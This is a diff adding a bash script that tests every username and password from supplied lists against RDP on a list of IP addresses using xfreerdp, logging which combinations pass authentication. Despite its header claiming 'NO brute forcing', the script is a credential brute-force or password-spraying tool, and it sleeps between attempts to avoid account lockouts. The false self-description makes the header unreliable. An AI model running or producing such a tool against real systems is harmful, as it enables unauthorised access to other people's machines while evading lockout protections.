@@ -1,0 +1,62 @@
+#!/bin/bash
+# Verify RDP credentials against a list of IPs (NO brute forcing)
+# Usage: ./rdp_auth_verify.sh rdp_ips.txt users.txt passwords.txt
+# Example:
+#   users.txt: one username per line
+#   passwords.txt: one password per line
+
+IPS_FILE="${1:-rdp_ips.txt}"
+USERS_FILE="${2:-users.txt}"
+PASS_FILE="${3:-passwords.txt}"
+OUTDIR="RDP_AUTH_VERIFY_$(date +%F_%H%M)"
+mkdir -p "$OUTDIR"
+
+unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY
+
+if [[ ! -f "$IPS_FILE" || ! -f "$USERS_FILE" || ! -f "$PASS_FILE" ]]; then
+  echo "Usage: $0 rdp_ips.txt users.txt passwords.txt"
+  exit 1
+fi
+
+echo "[+] Output: $OUTDIR"
+echo ""
+
+while read -r IP; do
+  [[ -z "$IP" || "$IP" =~ ^# ]] && continue
+  mkdir -p "$OUTDIR/$IP"
+
+  while read -r USER; do
+    [[ -z "$USER" || "$USER" =~ ^# ]] && continue
+
+    while read -r PASS; do
+      [[ -z "$PASS" || "$PASS" =~ ^# ]] && continue
+
+      TS=$(date +%F_%H%M%S)
+      OUTFILE="$OUTDIR/$IP/${TS}_${USER}.txt"
+
+      if command -v xfreerdp3 >/dev/null 2>&1; then
+        xfreerdp3 /v:"$IP" /cert:ignore /u:"$USER" /p:"$PASS" +auth-only \
+          > "$OUTFILE" 2>&1
+      else
+        xfreerdp /v:"$IP" /cert:ignore /u:"$USER" /p:"$PASS" +auth-only \
+          > "$OUTFILE" 2>&1
+      fi
+
+      # quick result tag
+      if grep -qi "ERRCONNECT_LOGON_FAILURE" "$OUTFILE"; then
+        echo "[-] $IP :: $USER (FAIL)"
+      elif grep -qi "Authentication only, exit status 0" "$OUTFILE"; then
+        echo "[?] $IP :: $USER (REACHED AUTH PHASE)"
+      else
+        echo "[*] $IP :: $USER (CHECK LOG)"
+      fi
+
+      # Important: sleep to avoid triggering lockouts
+      sleep 3
+
+    done < "$PASS_FILE"
+  done < "$USERS_FILE"
+
+done < "$IPS_FILE"
+
+echo "[✅] Completed. Results saved in $OUTDIR"
